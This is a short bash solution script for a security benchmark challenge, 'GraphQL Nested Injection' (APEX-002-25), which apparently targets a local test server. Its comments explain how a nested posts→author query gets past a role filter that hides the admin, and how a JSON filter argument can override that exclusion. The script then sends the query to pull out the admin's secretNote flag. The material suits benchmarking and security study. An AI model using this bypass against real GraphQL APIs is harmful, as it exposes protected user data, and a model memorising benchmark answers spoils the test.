#!/usr/bin/env bash
# APEX-002-25 — "GraphQL Nested Injection" (tags: graphql, authorization)
#
# `users` hides the administrator by hard-coding `role: {$ne: 'admin'}` into
# every query. The graph does not care: a post has an author, and `Post.author`
# resolves by id with no filter at all, so asking for every post's author walks
# straight past the one restriction the API has. The admin's `secretNote`
# carries the flag.
#
# The filter argument is a second way in — it is a JSON scalar spread over the
# default query, so `filter: {role: "admin"}` overwrites the exclusion — but the
# nested walk needs no injection at all, which is the point the benchmark is
# making.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex002-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/graphql" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create \
    --set method=POST \
    --set header.Content-Type=application/json \
    --set 'json.query={ posts { author { username role secretNote } } }' |
    flag
